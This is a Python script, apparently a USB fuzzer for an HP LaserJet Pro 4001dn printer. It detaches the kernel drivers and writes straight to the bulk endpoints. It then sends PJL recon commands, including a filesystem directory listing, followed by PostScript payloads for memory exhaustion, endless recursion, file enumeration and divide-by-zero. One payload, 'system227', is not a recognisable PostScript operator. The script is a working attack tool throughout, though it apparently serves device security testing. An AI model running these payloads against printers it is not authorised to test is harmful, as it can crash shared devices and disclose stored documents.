#!/usr/bin/env python3
"""Direct USB bulk endpoint fuzzer for HP LaserJet Pro 4001dn"""
import usb.core
import usb.util
import time

VENDOR  = 0x03f0
PRODUCT = 0x0274

dev = usb.core.find(idVendor=VENDOR, idProduct=PRODUCT)
if dev is None:
    raise RuntimeError("Printer not found")

# Detach whatever has the interface (ipp-usb, usblp, doesn't matter)
for iface in range(dev.get_active_configuration().bNumInterfaces):
    if dev.is_kernel_driver_active(iface):
        dev.detach_kernel_driver(iface)
        print(f"Detached kernel driver from interface {iface}")

dev.set_configuration()

cfg  = dev.get_active_configuration()
intf = cfg[(0, 0)]

ep_out = usb.util.find_descriptor(intf, custom_match=lambda e:
    usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_OUT)
ep_in  = usb.util.find_descriptor(intf, custom_match=lambda e:
    usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_IN)

print(f"Bulk OUT: 0x{ep_out.bEndpointAddress:02x}")
print(f"Bulk IN:  0x{ep_in.bEndpointAddress:02x}")

UEL = b"\x1b%-12345X"

def send(payload: bytes, label: str):
    try:
        ep_out.write(payload, timeout=5000)
        print(f"[{label}] sent {len(payload)} bytes")
        time.sleep(0.5)
        try:
            resp = ep_in.read(4096, timeout=2000)
            print(f"[{label}] response: {bytes(resp)!r}")
        except usb.core.USBTimeoutError:
            pass
    except Exception as e:
        print(f"[{label}] ERROR: {e}")

# PJL recon
send(UEL + b"@PJL INFO ID\r\n"        + UEL, "INFO ID")
send(UEL + b"@PJL INFO VARIABLES\r\n" + UEL, "INFO VARIABLES")
send(UEL + b"@PJL FSDIRLIST NAME=\"0:\\\" ENTRY=1 COUNT=50\r\n" + UEL, "DIRLIST")

# Basic PS fuzz cases
CASES = [
    (b"%!PS-Adobe-3.0\n65535 65535 string pop\nshowpage\n%%EOF\n",  "mem-exhaust"),
    (b"%!PS-Adobe-3.0\n/r{r}def r\nshowpage\n%%EOF\n",             "recurse"),
    (b"%!PS-Adobe-3.0\n(*){=}255 string filenameforall\n%%EOF\n",  "fs-enum"),
    (b"%!PS-Adobe-3.0\nsystem227\nshowpage\n%%EOF\n",              "system227"),
    (b"%!PS-Adobe-3.0\n0 0 div\nshowpage\n%%EOF\n",                "div-zero"),
]

for payload, label in CASES:
    send(payload, label)
    time.sleep(1.5)
